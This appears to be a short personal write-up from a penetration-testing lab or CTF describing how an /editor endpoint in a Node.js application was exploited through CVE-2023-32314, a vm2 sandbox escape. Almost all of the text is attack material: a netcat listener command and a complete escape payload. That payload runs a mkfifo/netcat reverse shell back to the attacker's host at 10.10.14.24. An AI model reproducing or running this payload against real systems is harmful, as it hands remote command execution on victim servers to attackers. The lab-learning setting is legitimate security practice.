In the /editor endpoint the node js code was vulnerable to the following cve
* https://www.cve.org/CVERecord?id=CVE-2023-32314*

Using the following payload in the editor field I was able to establish a reverse shell. The following is the attack path followed:
	A listener on my attack host was setup:
		`nc -lvnp 6969`
	The following payload was inputted into the editor field:
		`const { VM } = require("vm2");`
		`const vm = new VM();`
		`const code = `
		  `const err = new Error();`
		  `err.name = {`
		    `toString: new Proxy(() => "", {`
		      `apply(target, thiz, args) {`
		        `const process = args.constructor.constructor("return process")();`
		        throw process.mainModule.require("child_process").execSync("**==mkfifo /tmp/f; nc 10.10.14.24 6969 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f==**").toString();
		      `},`
		    `}),`
		  `};`
		  `try {`
		    `err.stack;`
		  `} catch (stdout) {`
		    `stdout;`
		  `}`
		`;`
		
		`console.log(vm.run(code)); // -> hacked`

![[Pasted image 20240406150614.png]]

